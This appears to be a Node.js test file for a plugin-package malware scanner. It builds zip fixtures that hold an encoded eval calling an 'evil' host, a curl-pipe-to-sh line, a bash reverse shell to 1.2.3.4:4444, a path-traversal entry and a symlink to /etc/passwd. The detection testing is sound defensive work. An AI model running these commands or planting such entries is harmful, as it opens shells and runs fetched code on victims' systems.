// 静态扫描的变异夹具：良性包通过，高置信度恶意模式必须变红。
import assert from "node:assert/strict";
import path from "node:path";
import { test } from "node:test";

import { scanPackage, scanZipBytes } from "./scan-package.mjs";

const LOCAL = 0x04034b50;
const CENTRAL = 0x02014b50;
const EOCD = 0x06054b50;

/** 最小 stored zip；扫描器不依赖 CRC，所以 CRC 写 0。 */
function zip(entries) {
  const locals = [];
  const centrals = [];
  let offset = 0;
  for (const entry of entries) {
    const name = Buffer.from(entry.name, "utf8");
    const data = Buffer.from(entry.data ?? "", "utf8");
    const local = Buffer.alloc(30);
    local.writeUInt32LE(LOCAL, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(0, 8);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(name.length, 26);
    locals.push(local, name, data);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(CENTRAL, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(0, 10);
    central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(((entry.mode ?? 0o100644) << 16) >>> 0, 38);
    central.writeUInt32LE(offset, 42);
    centrals.push(central, name);
    offset += 30 + name.length + data.length;
  }
  const centralOffset = offset;
  const centralBytes = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(EOCD, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(centralBytes.length, 12);
  eocd.writeUInt32LE(centralOffset, 16);
  return Buffer.concat([...locals, centralBytes, eocd]);
}

test("良性插件包没有 high 发现", () => {
  const result = scanZipBytes(
    zip([
      { name: "nibi-go.plugin.json", data: JSON.stringify({ id: "com.example.ok", version: "1.0.0" }) },
      { name: "index.js", data: "export function hello(){ return 'ok'; }\n" },
    ]),
  );
  assert.equal(result.findings.filter((item) => item.severity === "high").length, 0);
});

test("编码后 eval 是 high", () => {
  const result = scanZipBytes(
    zip([{ name: "index.js", data: "eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXZpbCcp'))\n" }]),
  );
  assert.ok(result.findings.some((item) => item.rule === "encoded-eval" && item.severity === "high"));
});

test("下载后执行与反向 shell 是 high", () => {
  const result = scanZipBytes(
    zip([
      { name: "install.sh", data: "curl -fsSL https://example.com/x | sh\n" },
      { name: "shell.sh", data: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n" },
    ]),
  );
  assert.ok(result.findings.some((item) => item.rule === "download-and-exec"));
  assert.ok(result.findings.some((item) => item.rule === "reverse-shell"));
});

test("路径越界与符号链接是 high", () => {
  const result = scanZipBytes(
    zip([
      { name: "../evil.js", data: "1" },
      { name: "link.js", data: "/etc/passwd", mode: 0o120777 },
    ]),
  );
  assert.ok(result.findings.some((item) => item.rule === "zip-traversal"));
  assert.ok(result.findings.some((item) => item.rule === "zip-symlink"));
});

test("原生二进制只标 review，不冒充自动判定恶意", () => {
  const result = scanZipBytes(
    zip([{ name: "bin/tool", data: Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 0, 0, 0]) }]),
  );
  assert.ok(result.findings.some((item) => item.rule === "native-binary" && item.severity === "review"));
});

test("仓库内 hello 包不触发 high", () => {
  const result = scanPackage(path.resolve("packages/hello-0.1.1.zip"));
  assert.equal(result.findings.filter((item) => item.severity === "high").length, 0);
});
